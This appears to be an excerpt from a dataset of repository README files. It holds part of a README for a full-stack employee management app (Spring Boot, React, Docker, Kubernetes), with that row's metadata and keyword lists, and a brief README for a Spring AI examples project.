**Dashboard Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/dashboard.png"" alt=""Dashboard Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Employee List Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/employees-page.png"" alt=""Employee List Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Department List Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/departments-page.png"" alt=""Department List Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Add Employee Form:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/add-employee.png"" alt=""Add Employee Form"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Edit Employee Form:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/edit-employee.png"" alt=""Edit Employee Form"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Edit Department Form:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/edit-department.png"" alt=""Edit Department Form"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Login Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/login.png"" alt=""Login Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Register Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/register.png"" alt=""Register Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**404 Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/404.png"" alt=""404 Page"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Footer:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/footer.png"" alt=""Footer"" style=""border-radius: 10px"" width=""100%""/>
</p>

**Responsive Design Example - Dashboard Page:**

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/dashboard-responsive.png"" alt=""Responsive Design"" style=""border-radius: 10px"" width=""60%""/>
</p>

<p align=""center"">
 And many more features & pages to explore! Feel free to navigate through the application and test the various functionalities.
</p>

## API Endpoints

Here's a table listing all the RESTful API endpoints provided by this application:

| Endpoint                | Method | Description                         |
|-------------------------|--------|-------------------------------------|
| `/api/employees`        | GET    | Get all employees                   |
| `/api/employees/{id}`   | GET    | Get an employee by ID               |
| `/api/employees`        | POST   | Add a new employee                  |
| `/api/employees/{id}`   | PUT    | Update an employee by ID            |
| `/api/employees/{id}`   | DELETE | Delete an employee by ID            |
| `/api/departments`      | GET    | Get all departments                 |
| `/api/departments/{id}` | GET    | Get a department by ID              |
| `/api/departments`      | POST   | Add a new department                |
| `/api/departments/{id}` | PUT    | Update a department by ID           |
| `/api/departments/{id}` | DELETE | Delete a department by ID           |
| `/swagger-ui.html`      | GET    | Access the Swagger UI documentation |

## File Structure

```
employee-management-app
│
├── docker-compose.yaml
│
├── .mvn
│   └── wrapper
│       └── maven-wrapper.properties
│
├── kubernetes
│   ├── configmap.yaml
│   ├── backend-deployment.yaml
│   ├── backend-service.yaml
│   ├── frontend-deployment.yaml
│   └── frontend-service.yaml
│
├── nginx
│   ├── Dockerfile
│   └── nginx.conf 
│
├── backend
│   ├── src
│   │   ├── main
│   │   │   ├── java
│   │   │   │   └── com
│   │   │   │       └── example
│   │   │   │           └── employeemanagement
│   │   │   │               ├── EmployeeManagementApplication.java
│   │   │   │               ├── config
│   │   │   │               │   └── CorsConfig.java
│   │   │   │               │   └── DataInitializer.java
│   │   │   │               ├── controller
│   │   │   │               │   ├── DepartmentController.java
│   │   │   │               │   └── EmployeeController.java
│   │   │   │               ├── model
│   │   │   │               │   ├── Department.java
│   │   │   │               │   └── Employee.java
│   │   │   │               ├── repository
│   │   │   │               │   ├── DepartmentRepository.java
│   │   │   │               │   └── EmployeeRepository.java
│   │   │   │               ├── service
│   │   │   │               │   └── DataInitializer.java
│   │   │   │               └── exception
│   │   │   │                   └── ResourceNotFoundException.java
│   │   │   └── resources
│   │   │       ├── application.properties
│   │   │       └── data.sql
│   │   └── test
│   │       └── java
│   │           └── com
│   │               └── example
│   │                   └── employeemanagement
│   │                       └── EmployeeManagementApplicationTests.java
│   ├── .gitignore
│   └── pom.xml
│   └── compose.yaml
│
└── frontend
    ├── build
    ├── public
    │   ├── index.html
    │   └── favicon.ico
    │   └── manifest.json
    │   └── robots.txt
    │   └── icon-192x192.webp
    │   └── icon-512x512.webp
    ├── src
    │   ├── components
    │   │   ├── Dashboard.js
    │   │   ├── EmployeeList.js
    │   │   ├── EmployeeForm.js
    │   │   ├── DepartmentList.js
    │   │   ├── DepartmentForm.js
    │   │   └── Navbar.js
    │   ├── services
    │   │   ├── employeeService.js
    │   │   └── departmentService.js
    │   ├── App.js
    │   ├── index.js
    │   ├── index.css
    │   ├── reportWebVitals.js
    │   └── App.css
    │   └── theme.js
    ├── Dockerfile
    ├── postcss.config.js
    ├── tailwind.config.js
    └── package.json
```

## Backend Setup

### 1. Prerequisites

Ensure that you have Java 11 installed on your local machine. If not, follow the instructions below:

- For MacOS:
    ```bash
    brew install openjdk@11
    export JAVA_HOME=/usr/local/opt/openjdk@11
    ```

- For Windows: Download OpenJDK 11 from [https://jdk.java.net/archive/](https://jdk.java.net/archive/) and follow the installation instructions.

- Also, ensure that MongoDB and MySQL are installed and running on your local machine.

### 2. Clone the Repository

```bash
git clone https://github.com/hoangsonww/Employee-Management-Fullstack-App.git
cd Employee-Management-Fullstack-App  # Fix the paths if necessary
cd backend
```

### 3. Install Dependencies

First, ensure you have [Maven](https://maven.apache.org/) and [Java JDK](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) installed. Run the following command to install them:

- For MacOS:
    ```bash
    brew install maven
    ```
- For Windows: Download Maven from [https://maven.apache.org/download.cgi](https://maven.apache.org/download.cgi) and follow the installation instructions.

Next, install the project dependencies:

```bash
mvn install
```

### 4. Configure the Application

Update `src/main/resources/application.properties` with your MySQL and MongoDB configuration:

```properties
# MySQL Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/employee_management
spring.datasource.username=root
spring.datasource.password=password
spring.jpa.hibernate.ddl-auto=update

# MongoDB Configuration
spring.data.mongodb.uri=mongodb://localhost:27017/employee_management
```

Feel free to change the database name, username, and password, and even add more configurations as needed.

Alternatively, create a `config.properties` file in the `backend` directory and keep the `application.properties` file as is. Add the following properties to the `config.properties` file:

```properties
MYSQL_HOST=<mysql_host>
MYSQL_PORT=<mysql_port>
MYSQL_DB=<mysql_db>
MYSQL_USER=<mysql_user>
MYSQL_PASSWORD=<mysql_password>
MYSQL_SSL_MODE=<mysql_ssl_mode>
MONGO_URI=<mongo_host>
```

### 5. Start the Backend Server

Before starting the server, ensure that MySQL and MongoDB are running and properly configured on your local machine!

Then, run the following command to start the Spring Boot application:

```bash
mvn spring-boot:run
```

The backend will be available at [http://localhost:8080](http://localhost:8080).

### 6. Access the API Endpoints

- **Get All Employees:**

  ```bash
  curl -X GET http://localhost:8080/api/employees
  ```

- **Get Employee by ID:**

  ```bash
  curl -X GET http://localhost:8080/api/employees/1
  ```

- **Get All Departments:**

  ```bash
  curl -X GET http://localhost:8080/api/departments
  ```

- **Get Department by ID:**

  ```bash
  curl -X GET http://localhost:8080/api/departments/1
  ```

- **Feel free to add more API endpoints as needed...**

### 7. API Documentation

#### Overview

This application also uses Swagger to provide an interactive API documentation interface. The Swagger UI allows developers to explore the available API endpoints, view detailed information about each endpoint, and test the endpoints directly from the browser.

#### How to Access the API Documentation

1. **Start the Backend Server**: Ensure that the backend server is running. You can start the server by navigating to the backend directory and running:

   ```bash
   mvn spring-boot:run
   ```

2. **Open the Swagger UI**: Once the server is up and running, you can access the Swagger UI by navigating to the following URL in your web browser:

   [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)

   This will open the Swagger interface where you can explore the API endpoints.

3. Alternatively, for those who need the raw OpenAPI JSON, it is available at:

   [http://localhost:8080/v3/api-docs](http://localhost:8080/v3/api-docs)

4. **Explore the API Endpoints**:
- Use the sidebar or the search bar to navigate through the available API endpoints.
- Click on an endpoint to view its details, including the request method (GET, POST, PUT, DELETE), parameters, request body, and possible responses.
- You can also test the endpoints directly by clicking the **""Try it out""** button, providing the necessary input, and executing the request.
- If you have everything set up correctly, you should see the following Swagger UI interface:

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/apis.png"" alt=""Swagger UI"" style=""border-radius: 10px"" width=""100%""/>
</p>

#### Benefits of Using Swagger UI

- **Interactive Documentation**: Developers can easily understand and use the API.
- **Quick Testing**: Test the API endpoints directly from the browser without needing a separate tool.
- **Clear Communication**: Provides a standardized way of documenting your API, making it easier for others to understand and consume.

### 8. Backend JUnit Testing

To run the unit and integration tests, use:

```bash
mvn test
```

This will run the tests and provide you with the results. Ensure that all tests pass before making any changes to the application.

Feel free to add more tests as needed to ensure the reliability and correctness of your application.

## Frontend Setup

### 1. Clone the Repository

```bash
git clone https://github.com/hoangsonww/Employee-Management-Fullstack-App.git
cd frontend
```

### 2. Install Dependencies

Ensure you have [Node.js](https://nodejs.org/) and [npm](https://www.npmjs.com/) installed. Run the following command to install the required dependencies:

```bash
npm install
```

### 3. Set Up Environment Variables

Create a `.env` file in the root of your project if it doesn't already exist. Add the following environment variable:

```env
REACT_APP_API_URL=http://localhost:8080/api
```

### 4. Start the Development Server

Run the following command to start the React development server:

```bash
npm start
```

The frontend will be available at [http://localhost:3000](http://localhost:3000).

### 5. Build for Production

To create a production build of your application, run:

```bash
npm run build
```

The build files will be generated in the `build` directory. You can deploy these files to your production server.

### 6. Test the Application (Optional)

To run tests for the frontend application, use the following command:

```bash
npm test
```

**NOTE: You might need different IDEs for the backend and the frontend. FYI, I used IntelliJ IDEA for the backend and Webstorm for the frontend.**

## Detailed Component Instructions

### `Dashboard.js`

Displays various metrics related to employees, such as total employee count, average age, employee growth over time, and distribution by age range. It uses `react-chartjs-2` to render bar charts.

### `EmployeeList.js`

Shows a list of employees with options to search, paginate, and delete entries. Includes a link to add a new employee and edit existing employees.

### `EmployeeForm.js`

Provides a form for adding or editing employee details. Fetches departments to populate the department dropdown. Uses `useParams` to determine if it's in edit mode or add mode.

### `DepartmentList.js`

Displays a list of departments with options to search, paginate, and delete entries. Includes a link to add a new department and edit existing departments.

### `DepartmentForm.js`

Provides a form for adding or editing department details.

### `Navbar.js`

The navigation bar component that includes links to various pages such as Dashboard, Employees, and Departments. Highlights the currently active page.

## Containerization

If you'd also like to containerize the project, the project also includes the `dockerfile` and `docker-compose.yaml` files for containerization. You can build and run the application in a Docker container using the following command:

```bash
docker compose up --build
```

This command will build the Docker images for the frontend and backend, create containers, and start the application. Feel free to view them in Docker Desktop.

Alternatively, you can navigate to the `backend` and `frontend` directories and build the Docker images separately using the following commands:

```bash
docker build -t <your_docker_username>/employee-management-app-backend .
docker build -t <your_docker_username>/employee-management-app-frontend .
```

Then, you can run the containers using the following commands:

```bash
docker run -p 8080:8080 <your_docker_username>/employee-management-app-backend
docker run -p 3000:3000 <your_docker_username>/employee-management-app-frontend
```

Also, you can push the Docker images to Docker Hub using the following commands:

```bash
docker push <your_docker_username>/employee-management-app-backend
docker push <your_docker_username>/employee-management-app-frontend
```

Additionally, you can access the image on **Docker Hub** **[here](https://hub.docker.com/repository/docker/hoangsonw/employee-management-app/).**

## Kubernetes

The project also includes Kubernetes configuration files in the `kubernetes` directory for deploying the application to a Kubernetes cluster. You can deploy the application to a Kubernetes cluster using the following command:

```bash
kubectl apply -f kubernetes
```

This command will create the necessary deployments, services, and config maps for the frontend and backend. You can access the application using the NodePort or LoadBalancer service created.

## LoadBalancer Service

The project also features Nginx as a LoadBalancer service for routing traffic to the frontend and backend services. The Nginx configuration file is located in the `nginx` directory.

There is also a `Dockerfile` for building the Nginx image. We are using this file to build the Nginx image and deploy it to the cloud with Render, which we are currently using to balance the traffic of the frontend and backend services.

Feel free to customize the Nginx configuration to suit your specific requirements and deployment process.

## Jenkins

The project also includes a `Jenkinsfile` for automating the build and deployment process using Jenkins. You can create a Jenkins pipeline job and use the `Jenkinsfile` to build and deploy the application to a Kubernetes cluster.

Feel free to customize the Jenkins pipeline to suit your specific requirements and deployment process.

## Troubleshooting

### Backend Issues

- **`Could not autowire` Errors**: Ensure that all dependencies are correctly defined in the `pom.xml` and that the repository interfaces are located in the correct package structure.

- **`Exception opening socket` for MongoDB**: Verify that MongoDB is running and accessible at `localhost:27017`. Check MongoDB logs for any connection issues.

- **`Build failed`**: Ensure that you are using Java 11 and that all dependencies are correctly installed. Check the `pom.xml` file for any missing dependencies.

- Regardless of the error, perhaps you can try running the following commands to clean and rebuild the project:

  ```bash
  mvn clean install
  ```

  If the issue persists, you can run Maven with more detailed logging to identify the problem:

  ```bash
  mvn -X spring-boot:run
  ```

### Frontend Issues

- **Error: Cannot read properties of undefined (reading 'id')**: Ensure that the `employee` object in `EmployeeForm` is correctly initialized and that the `id` parameter is correctly passed. Check the `getEmployeeById` and `updateEmployee` functions for proper handling of data.

- **Chart Issues**: Ensure `Chart.js` and `react-chartjs-2` are correctly installed and configured. Verify that the chart data passed to components is in the correct format.

- Regardless of the error, perhaps you can try running the following commands to clean and rebuild the project:

  ```bash
  npm install
  ```

  If the issue persists, you can run the React development server with more detailed logging to identify the problem:

  ```bash
  npm start --verbose
  ```

## Contributing

If you'd like to contribute to the project, please fork the repository and submit a pull request with your changes. Ensure that you follow the project's coding standards and include relevant tests for new features.

## License

This project is licensed under the **MIT License.** See the [LICENSE](LICENSE) file for details.

## Contact

For any questions or issues, please contact [hoangson091104@gmail.com](mailto:hoangson091104@gmail.com).

---

Thank you for checking out the **Employee Management Full-Stack Application!** Feel free to use this project for your own learning or development purposes.

Created with ❤️ by [Son Nguyen](https://github.com/hoangsonww) in 2024.

---

**[⬆ Back to Top](#employee-management-full-stack-application)**
",0,0,5,mit,4.0,"['employee', 'management', 'application', 'table', 'content', 'overview', 'live', 'deployment', 'key', 'technology', 'user', 'interface', 'file', 'structure', 'api', 'endpoint', 'backend', 'setup', 'prerequisite', 'clone', 'repository', 'install', 'dependency', 'configure', 'application', 'start', 'backend', 'server', 'access', 'api', 'endpoint', 'api', 'documentation', 'overview', 'access', 'api', 'documentation', 'benefit', 'using', 'swagger', 'ui', 'backend', 'junit', 'testing', 'frontend', 'setup', 'clone', 'repository', 'install', 'dependency', 'set', 'environment', 'variables', 'start', 'development', 'server', 'build', 'production', 'test', 'application', 'optional', 'detailed', 'component', 'instruction', 'containerization', 'kubernetes', 'loadbalancer', 'service', 'jenkins', 'troubleshooting', 'contributing', 'license', 'contact', 'overview', 'employee', 'management', 'system', 'dynamic', 'application', 'seamlessly', 'combine', 'traditional', 'technology', 'integrating', 'modern', 'react', 'frontend', 'classic', 'spring', 'boot', 'backend', 'project', 'demonstrates', 'new', 'established', 'technology', 'harmoniously', 'work', 'together', 'create', 'robust', 'efficient', 'application', 'managing', 'employee', 'department', 'data', 'live', 'deployment', 'employee', 'management', 'system', 'app', 'deployed', 'vercel', 'live', 'http', 'explore', 'interact', 'application', 'backend', 'also', 'deployed', 'render', 'available', 'http', 'access', 'api', 'endpoint', 'directly', 'browser', 'note', 'backend', 'api', 'may', 'spin', 'due', 'inactivity', 'may', 'need', 'wait', 'minute', 'api', 'start', 'feel', 'free', 'test', 'api', 'endpoint', 'explore', 'application', 'run', 'backend', 'locally', 'connect', 'frontend', 'seamless', 'experience', 'additionally', 'may', 'take', 'fetch', 'data', 'render', 'free', 'tier', 'limited', 'resource', 'ram', 'cpu', 'please', 'patient', 'data', 'load', 'key', 'technology', 'react', 'frontend', 'modern', 'javascript', 'library', 'building', 'user', 'interface', 'providing', 'responsive', 'interactive', 'experience', 'react', 'router', 'routing', 'library', 'react', 'enables', 'navigation', 'url', 'handling', 'application', 'javascript', 'library', 'creating', 'responsive', 'customizable', 'chart', 'graph', 'axios', 'http', 'client', 'making', 'api', 'request', 'tailwind', 'cs', 'cs', 'framework', 'creating', 'custom', 'design', 'minimal', 'cs', 'redux', 'predictable', 'state', 'container', 'managing', 'application', 'state', 'jest', 'react', 'testing', 'library', 'testing', 'library', 'unit', 'integration', 'testing', 'react', 'component', 'java', 'spring', 'boot', 'backend', 'powerful', 'established', 'java', 'framework', 'building', 'application', 'java', 'offering', 'robust', 'backend', 'support', 'data', 'management', 'spring', 'data', 'jpa', 'part', 'spring', 'data', 'project', 'make', 'easy', 'implement', 'repository', 'spring', 'boot', 'actuator', 'set', 'feature', 'help', 'monitor', 'manage', 'application', 'spring', 'hibernate', 'mapping', 'orm', 'library', 'java', 'provides', 'framework', 'mapping', 'domain', 'model', 'relational', 'database', 'spring', 'boot', 'starter', 'web', 'starter', 'building', 'web', 'application', 'including', 'restful', 'application', 'websocket', 'service', 'spring', 'boot', 'starter', 'data', 'jpa', 'starter', 'using', 'spring', 'data', 'jpa', 'hibernate', 'restful', 'apis', 'representational', 'state', 'transfer', 'rest', 'apis', 'communication', 'frontend', 'backend', 'java', 'latest', 'lts', 'version', 'java', 'providing', 'support', 'stability', 'junit', 'popular', 'testing', 'framework', 'java', 'provides', 'annotation', 'writing', 'test', 'swagger', 'tool', 'documenting', 'testing', 'restful', 'apis', 'docker', 'containerization', 'platform', 'packaging', 'application', 'dependency', 'kubernetes', 'container', 'orchestration', 'platform', 'automating', 'deployment', 'scaling', 'management', 'containerized', 'application', 'jenkins', 'automation', 'server', 'help', 'automate', 'part', 'software', 'development', 'related', 'building', 'testing', 'delivering', 'facilitating', 'continuous', 'integration', 'continuous', 'delivery', 'mysql', 'reliable', 'relational', 'database', 'structured', 'data', 'storage', 'mongodb', 'flexible', 'nosql', 'database', 'data', 'style', 'guide', 'project', 'follows', 'following', 'popular', 'style', 'guide', 'ensure', 'clean', 'consistent', 'code', 'airbnb', 'javascript', 'style', 'guide', 'popular', 'style', 'guide', 'writing', 'clean', 'consistent', 'javascript', 'code', 'google', 'java', 'style', 'guide', 'style', 'guide', 'writing', 'java', 'code', 'readable', 'maintainable', 'user', 'interface', 'frontend', 'employee', 'management', 'system', 'provides', 'interface', 'managing', 'employee', 'department', 'includes', 'feature', 'viewing', 'adding', 'editing', 'deleting', 'employee', 'department', 'app', 'also', 'includes', 'visualization', 'employee', 'metric', 'growth', 'time', 'distribution', 'age', 'range', 'frontend', 'also', 'live', 'http', 'explore', 'interact', 'application', 'note', 'backend', 'hosted', 'api', 'call', 'work', 'data', 'present', 'landing', 'page', 'dashboard', 'page', 'employee', 'list', 'page', 'department', 'list', 'page', 'add', 'employee', 'form', 'edit', 'employee', 'form', 'edit', 'department', 'form', 'login', 'page', 'register', 'page', 'page', 'footer', 'responsive', 'design', 'example', 'dashboard', 'page', 'api', 'endpoint', 'table', 'listing', 'restful', 'api', 'endpoint', 'provided', 'application', 'endpoint', 'method', 'description', 'get', 'get', 'employee', 'get', 'get', 'employee', 'id', 'post', 'add', 'new', 'employee', 'put', 'update', 'employee', 'id', 'delete', 'delete', 'employee', 'id', 'get', 'get', 'department', 'get', 'get', 'department', 'id', 'post', 'add', 'new', 'department', 'put', 'update', 'department', 'id', 'delete', 'delete', 'department', 'id', 'get', 'access', 'swagger', 'ui', 'documentation', 'file', 'structure', 'backend', 'setup', 'prerequisite', 'ensure', 'java', 'installed', 'local', 'machine', 'follow', 'instruction', 'macos', 'window', 'download', 'openjdk', 'http', 'follow', 'installation', 'instruction', 'also', 'ensure', 'mongodb', 'mysql', 'installed', 'running', 'local', 'machine', 'clone', 'repository', 'install', 'dependency', 'first', 'ensure', 'maven', 'java', 'jdk', 'installed', 'run', 'following', 'command', 'install', 'macos', 'window', 'download', 'maven', 'http', 'follow', 'installation', 'instruction', 'next', 'install', 'project', 'dependency', 'configure', 'application', 'update', 'mysql', 'mongodb', 'configuration', 'feel', 'free', 'change', 'database', 'name', 'username', 'password', 'even', 'add', 'configuration', 'needed', 'alternatively', 'create', 'file', 'directory', 'keep', 'file', 'add', 'following', 'property', 'file', 'start', 'backend', 'server', 'starting', 'server', 'ensure', 'mysql', 'mongodb', 'running', 'properly', 'configured', 'local', 'machine', 'run', 'following', 'command', 'start', 'spring', 'boot', 'application', 'backend', 'available', 'http', 'access', 'api', 'endpoint', 'get', 'employee', 'get', 'employee', 'id', 'get', 'department', 'get', 'department', 'id', 'feel', 'free', 'add', 'api', 'endpoint', 'needed', 'api', 'documentation', 'overview', 'application', 'also', 'us', 'swagger', 'provide', 'interactive', 'api', 'documentation', 'interface', 'swagger', 'ui', 'allows', 'developer', 'explore', 'available', 'api', 'endpoint', 'view', 'detailed', 'information', 'endpoint', 'test', 'endpoint', 'directly', 'browser', 'access', 'api', 'documentation', 'start', 'backend', 'server', 'ensure', 'backend', 'server', 'running', 'start', 'server', 'navigating', 'backend', 'directory', 'running', 'open', 'swagger', 'ui', 'server', 'running', 'access', 'swagger', 'ui', 'navigating', 'following', 'url', 'web', 'browser', 'http', 'open', 'swagger', 'interface', 'explore', 'api', 'endpoint', 'alternatively', 'need', 'raw', 'openapi', 'json', 'available', 'http', 'explore', 'api', 'endpoint', 'use', 'sidebar', 'search', 'bar', 'navigate', 'available', 'api', 'endpoint', 'click', 'endpoint', 'view', 'detail', 'including', 'request', 'method', 'get', 'post', 'put', 'delete', 'parameter', 'request', 'body', 'possible', 'response', 'also', 'test', 'endpoint', 'directly', 'clicking', 'try', 'button', 'providing', 'necessary', 'input', 'executing', 'request', 'everything', 'set', 'correctly', 'see', 'following', 'swagger', 'ui', 'interface', 'benefit', 'using', 'swagger', 'ui', 'interactive', 'documentation', 'developer', 'easily', 'understand', 'use', 'api', 'quick', 'testing', 'test', 'api', 'endpoint', 'directly', 'browser', 'without', 'needing', 'separate', 'tool', 'clear', 'communication', 'provides', 'standardized', 'way', 'documenting', 'api', 'making', 'easier', 'others', 'understand', 'consume', 'backend', 'junit', 'testing', 'run', 'unit', 'integration', 'test', 'use', 'run', 'test', 'provide', 'result', 'ensure', 'test', 'pas', 'making', 'change', 'application', 'feel', 'free', 'add', 'test', 'needed', 'ensure', 'reliability', 'correctness', 'application', 'frontend', 'setup', 'clone', 'repository', 'install', 'dependency', 'ensure', 'npm', 'installed', 'run', 'following', 'command', 'install', 'required', 'dependency', 'set', 'environment', 'variables', 'create', 'file', 'root', 'project', 'already', 'exist', 'add', 'following', 'environment', 'variable', 'start', 'development', 'server', 'run', 'following', 'command', 'start', 'react', 'development', 'server', 'frontend', 'available', 'http', 'build', 'production', 'create', 'production', 'build', 'application', 'run', 'build', 'file', 'generated', 'directory', 'deploy', 'file', 'production', 'server', 'test', 'application', 'optional', 'run', 'test', 'frontend', 'application', 'use', 'following', 'command', 'note', 'might', 'need', 'different', 'ides', 'backend', 'frontend', 'fyi', 'used', 'intellij', 'idea', 'backend', 'webstorm', 'frontend', 'detailed', 'component', 'instruction', 'display', 'various', 'metric', 'related', 'employee', 'total', 'employee', 'count', 'average', 'age', 'employee', 'growth', 'time', 'distribution', 'age', 'range', 'us', 'render', 'bar', 'chart', 'show', 'list', 'employee', 'option', 'search', 'paginate', 'delete', 'entry', 'includes', 'link', 'add', 'new', 'employee', 'edit', 'existing', 'employee', 'provides', 'form', 'adding', 'editing', 'employee', 'detail', 'fetch', 'department', 'populate', 'department', 'dropdown', 'us', 'determine', 'edit', 'mode', 'add', 'mode', 'display', 'list', 'department', 'option', 'search', 'paginate', 'delete', 'entry', 'includes', 'link', 'add', 'new', 'department', 'edit', 'existing', 'department', 'provides', 'form', 'adding', 'editing', 'department', 'detail', 'navigation', 'bar', 'component', 'includes', 'link', 'various', 'page', 'dashboard', 'employee', 'department', 'highlight', 'currently', 'active', 'page', 'containerization', 'also', 'like', 'containerize', 'project', 'project', 'also', 'includes', 'file', 'containerization', 'build', 'run', 'application', 'docker', 'container', 'using', 'following', 'command', 'command', 'build', 'docker', 'image', 'frontend', 'backend', 'create', 'container', 'start', 'application', 'feel', 'free', 'view', 'docker', 'desktop', 'alternatively', 'navigate', 'directory', 'build', 'docker', 'image', 'separately', 'using', 'following', 'command', 'run', 'container', 'using', 'following', 'command', 'also', 'push', 'docker', 'image', 'docker', 'hub', 'using', 'following', 'command', 'additionally', 'access', 'image', 'docker', 'hub', 'kubernetes', 'project', 'also', 'includes', 'kubernetes', 'configuration', 'file', 'directory', 'deploying', 'application', 'kubernetes', 'cluster', 'deploy', 'application', 'kubernetes', 'cluster', 'using', 'following', 'command', 'command', 'create', 'necessary', 'deployment', 'service', 'config', 'map', 'frontend', 'backend', 'access', 'application', 'using', 'nodeport', 'loadbalancer', 'service', 'created', 'loadbalancer', 'service', 'project', 'also', 'feature', 'nginx', 'loadbalancer', 'service', 'routing', 'traffic', 'frontend', 'backend', 'service', 'nginx', 'configuration', 'file', 'located', 'directory', 'also', 'building', 'nginx', 'image', 'using', 'file', 'build', 'nginx', 'image', 'deploy', 'cloud', 'render', 'currently', 'using', 'balance', 'traffic', 'frontend', 'backend', 'service', 'feel', 'free', 'customize', 'nginx', 'configuration', 'suit', 'specific', 'requirement', 'deployment', 'process', 'jenkins', 'project', 'also', 'includes', 'automating', 'build', 'deployment', 'process', 'using', 'jenkins', 'create', 'jenkins', 'pipeline', 'job', 'use', 'build', 'deploy', 'application', 'kubernetes', 'cluster', 'feel', 'free', 'customize', 'jenkins', 'pipeline', 'suit', 'specific', 'requirement', 'deployment', 'process', 'troubleshooting', 'backend', 'issue', 'error', 'ensure', 'dependency', 'correctly', 'defined', 'repository', 'interface', 'located', 'correct', 'package', 'structure', 'mongodb', 'verify', 'mongodb', 'running', 'accessible', 'check', 'mongodb', 'log', 'connection', 'issue', 'ensure', 'using', 'java', 'dependency', 'correctly', 'installed', 'check', 'file', 'missing', 'dependency', 'regardless', 'error', 'perhaps', 'try', 'running', 'following', 'command', 'clean', 'rebuild', 'project', 'issue', 'persists', 'run', 'maven', 'detailed', 'logging', 'identify', 'problem', 'frontend', 'issue', 'error', 'read', 'property', 'undefined', 'reading', 'ensure', 'object', 'correctly', 'initialized', 'parameter', 'correctly', 'passed', 'check', 'function', 'proper', 'handling', 'data', 'chart', 'issue', 'ensure', 'correctly', 'installed', 'configured', 'verify', 'chart', 'data', 'passed', 'component', 'correct', 'format', 'regardless', 'error', 'perhaps', 'try', 'running', 'following', 'command', 'clean', 'rebuild', 'project', 'issue', 'persists', 'run', 'react', 'development', 'server', 'detailed', 'logging', 'identify', 'problem', 'contributing', 'like', 'contribute', 'project', 'please', 'fork', 'repository', 'submit', 'pull', 'request', 'change', 'ensure', 'follow', 'project', 'coding', 'standard', 'include', 'relevant', 'test', 'new', 'feature', 'license', 'project', 'licensed', 'mit', 'license', 'see', 'license', 'file', 'detail', 'contact', 'question', 'issue', 'please', 'contact', 'thank', 'checking', 'employee', 'management', 'application', 'feel', 'free', 'use', 'project', 'learning', 'development', 'purpose', 'created', 'son', 'nguyen', 'back', 'top']","['application', 'employee', 'backend', 'api', 'department']",3,0,0,"['employee', 'management', 'application', 'table', 'content', 'overview', 'live', 'deployment', 'key', 'technology', 'user', 'interface', 'api', 'endpoint', 'file', 'structure', 'backend', 'setup', 'prerequisite', 'clone', 'repository', 'fix', 'path', 'necessary', 'install', 'dependency', 'configure', 'application', 'mysql', 'configuration', 'mongodb', 'configuration', 'start', 'backend', 'server', 'access', 'api', 'endpoint', 'api', 'documentation', 'overview', 'how', 'access', 'api', 'documentation', 'benefit', 'using', 'swagger', 'ui', 'backend', 'junit', 'testing', 'frontend', 'setup', 'clone', 'repository', 'install', 'dependency', 'set', 'up', 'environment', 'variable', 'start', 'development', 'server', 'build', 'production', 'test', 'application', 'optional', 'detailed', 'component', 'instruction', 'containerization', 'kubernetes', 'loadbalancer', 'service', 'jenkins', 'troubleshoot', 'backend', 'issue', 'frontend', 'issue', 'contribute', 'license', 'contact']",47,"['api', 'backend', 'application', 'overview', 'endpoint']",29,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,25026,24.13235294117647,5.400670322973797,"['https://employee-management-fullstack-app.vercel.app -> https://employee-management-fullstack-app.vercel.app', 'https://employee-management-app.onrender.com -> https://employee-management-app-gdm5.onrender.com/', 'https://employee-management-fullstack-app.vercel.app -> https://employee-management-fullstack-app.vercel.app', 'https://jdk.java.net/archive/ -> https://jdk.java.net/archive/', 'Maven -> https://maven.apache.org/', 'Java JDK -> https://www.oracle.com/java/technologies/javase-jdk11-downloads.html', 'https://maven.apache.org/download.cgi -> https://maven.apache.org/download.cgi', 'http://localhost:8080 -> http://localhost:8080', 'http://localhost:8080/swagger-ui.html -> http://localhost:8080/swagger-ui.html', 'http://localhost:8080/v3/api-docs -> http://localhost:8080/v3/api-docs', 'Node.js -> https://nodejs.org/', 'npm -> https://www.npmjs.com/', 'http://localhost:3000 -> http://localhost:3000', 'here -> https://hub.docker.com/repository/docker/hoangsonw/employee-management-app/', 'Son Nguyen -> https://github.com/hoangsonww']",15
marcushellberg/spring-ai-examples,main,"# Practical AI examples using Spring AI

## Included examples

- Document summarization and analysis
- Sentiment analysis
- Text drafting
- Image data extraction
- Advanced RAG techniques
  - Multi-source retrieval
  - Re-ranking
  - Question rewriting

## Requirements

The application expects you to have the following two API keys as environment variables:
- `OPENAI_API_KEY`: OpenAI API key
- `COHERE_API_KEY`: Cohere API key for document re-ranking. See `RagChat.java` comments for more information.

## Running the examples

Run `Application.java` in your IDE or use the following command:

```bash
mvn spring-boot:run
```

## Using local models

You can use local models with Ollama by updating the spring-ai dependency in the `pom.xml` file, and defining which models to use in the `application.properties` file.

